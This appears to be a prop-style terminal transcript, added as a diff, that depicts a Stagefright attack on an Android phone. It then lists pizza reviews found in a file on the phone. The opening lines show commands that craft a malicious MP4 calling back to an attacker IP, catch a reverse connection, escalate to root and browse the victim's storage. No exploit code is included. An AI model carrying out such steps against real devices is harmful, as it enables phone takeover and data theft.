@@ -1,0 +1,157 @@
+.> http://i243.bxjyb2jvda.net/
+.  
+root@mobley_android: ~
+root@kali:~/stagefright# python mp4.py -c 192.251.68.248 -p 8080 -o hi.mp4
+Saving crafted MP4 to hi.mp4...
+root@kali:~/stagefright# python listener.py -p 8080
+Listening for incoming connections
+Receiving connection from 192.251.68.243
+Confirming uid=1013(media)
+Attempting root privilege escalation
+root@mobley_android:/# id
+uid=0(root) gid=0(root)
+.root@mobley_android:~/#ls  
+acct	     dev     	      mnt             	 seapp_contexts
+cache	     file_contexts    proc            	 storage
+config	     init    	      property_contexts	 sys
+data	     init.environ.rc  sbin            	 system
+default.php  misc	      sdcard		 ueventd.rc
+.root@mobley_android:~/#cd sdcard
+.root@mobley_android:~/sdcard# ls
+Android      HotKnot        Mob       Pictures  
+DCIM         LOST.DIR       Movies    System Volume Information
+Download     Masquerade     Music
+.root@mobley_android:~/sdcard# cd Android
+.root@mobley_android:~/sdcard/Android# ls
+eat.txt
+.root@mobley_android:~/sdcard/Android# cat eat.txt
+JOE'S
+Tried: Plain	
+Crust: NY Style	
+Hype factor: Major hype	
+Overall tastiness: Just ok; the cheese is lower quality and the sauce is sweet	
+Notes: At both locations there are a zillion pictures of celebs getting their slice 
+  
+IL PORTO
+Tried: The Al Diavolo - Brocolli Rabe, sausage, hot peppers and mozzarella	
+Crust: NY Style	
+Hype Factor: None, and most people found out about it because of their delivery range.	
+Overall tastiness: amazing - the rest of their food is killer too.	
+Notes: They are by the navy yard, so as that continues to gentrify, they will gain momentum, but they have been getting by on delivery of awesome pizza for years.
+  
+SARAGHINA
+Tried: Coppa Carciofi is the only thing I order and I don't want to otherwise discuss the menu
+Crust: Neapolitan 	
+Hype Factor: those that know love	
+Overall tastiness: Exemplar	
+Notes: Host is often a challenger, but the waitstaff is awesome
+  
+ROBERTA'S	
+Tried: pretty much all of them, but the best is the Bee sting (w/ sopresseta, chilli and honey)
+Crust: NY Style
+Overall tastiness: Awesome.  
+Hype factor: It's basically a haven for hipsters that don't have some kind of asshole eating restriction like gluten or cheese or meat... Note, Norbert's pizza is the Roberta's weak competition that does make gluten free vegan, ugh... it's too much of a disgrace to even finish writing.	
+Notes: They deliver. to my house, which has become a problem.  the wait at the restaurant isn't bad, but the delivery wait is like 70 minutes or something.  It's worth it.  they also have pizza's named awesome things like cheesus christ, millennium Falco, the lil stinker, axl rosenberg, crispy Glover, and the speckenwolf.  
+  
+JOHN'S
+Tried: Sausage
+Crust: NY Style	
+Hype factor: There's always a wait
+Overall tastiness: Decent pie	
+Notes: No Slices
+  
+DI FARA
+Tried: Cheese-only and pepperoni	
+Crust: NY style and Sicilian
+Overall tastiness: unmatchable.  It's about $5 for a slice, and $50 for a pie - but I'd pay $100.
+Hype factor: "Best in the world," ranked in magazines ranging from time out ny to the art of eating. People wait for a couple hours for a slice, more for a whole pie;	
+Notes: Dominic is in his 80s and makes every pie himself.  His daughter and son also work there, but he hides in the back to make the sauce - even his kids don't know the secret recipe.  He puts his asbestos hands into the 600 degree oven to turn the pies without flinching.  He cuts fresh basil that's brought to him washed and ready by his daughter - and he uses a few kinds of cheese.
+  
+GRIMALDI'S
+Tried: cheese and Pepperoni mostly
+Crust: NY Style
+Overall type: Damn good.
+Hype factor: Tourist spot in DUMBO, and new one in Coney Island
+Notes: Often a line to get in, but the wait isn't that long.  It moved locations (2 doors away) a few years ago which helped with this, but also made it less fun to go.  There also used to be rumors that there was some sort of battle between them and Patsy's pizza - which I didn't care about and stopped reading 
+  
+MOTORINO
+Tried: a bunch - the straciatella one always gets me though	
+Crust: NY style	
+Hype factor: It's on the main strip (bedford) in williamsburg and it's decent - that's all it needs to succeed	
+Overall tastiness: Damn good.	
+Note: Not a 'destination' pizza spot like Di Fara (which is in midwood - avenue J - near nothing.   nothing.)
+  
+LUIGI'S PIZZERIA
+Tried: Every single one.  their hawaiian has bacon instead of ham.  my favorite is a cheese slice right from the oven.  	
+Crust: NY style	
+Hype factor: none, really - but it's a know pizza counter - despite being a hole in the wall.	
+Overall tastiness: awesome.	
+Notes: take friends from out of town who want to try "New York Pizza"
+  
+TOTONNO'S
+Tried: Margherita pie	
+Crust: NY Style; thin with nice charred bits on bottom
+Hype factor: tons of hype.  some claim it's the best in NYC
+Overall tastiness: Prime.
+Notes: Long-ass wait.
+  
+FORNINO	
+Tried: clam pizza is the best here. ran the gamut 	
+Crust: Thin, Neapolitan
+Hype factor: Known entity
+Overall tastiness: solid
+Notes:  Still need to try 'AL Roker,' capicola, roasted red peppers and carmelized onions
+  
+SPEEDY ROMEO
+Tried:: mushroom, bechamel & egg; veal meatballs	
+Crust: Neapolitan 	
+Hype factor: Lot of moms and babies. 
+Overall tastiness: Decent.
+Notes: Good cheese-to-toppings ratio. Date spot?
+  
+SAL'S
+Tried: meatball and roasted pepper	
+Crust: NY Style	
+Hype Factor: Kind of a secret outside of Carroll Gardens	
+Tastiness Factor: Solidly delicious 	
+Notes: The current owner is the original owner (Sal)'s son; the restaurant next door was on Kitchen Nightmares.
+  
+ARTURO'S
+Tried: Pepperoni, mushroom, meatball, onion; pretty much all of them
+Crust: NY Style with coal oven taste
+Hype factor: Old place with jazz draws Village people and NYU parents.
+Overall tastiness: Supreme
+Notes: Go-to spot in the Village; better than John's.
+  
+L&B SPUMONI GARDEN
+Tried:	Square corner	
+Crust: Upside-down square (cheese on the bottom; sauce on the top)	
+Hype Factor: Most Brooklynite's favorite	
+Overall tastiness: Very, very tasty
+Notes: There are those that like the square, those that like the round and a few hardcore folks (me) that get both. There's also a restaurant and ices/ice cream.
+   
+ANY OF THE 99 CENT SPOTS	
+Tried: plain cheese. toppings are sometimes $1 - which is more than it costs for a second slice
+Crust: Basic
+Hype Factor: crappy	no need for hype.  It's cheap, it's pizza crust with sauce and cheese  any one who's drunk, poor, and/or hungry will try it.	
+Overall Tastiness: meh.  	
+Notes: Everyone's had it.  It's hard to pass by if you're hungry.  But you feel bad about yourself every time.
+root@mobley_android:~/sdcard/Android#  
+.       
+.  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
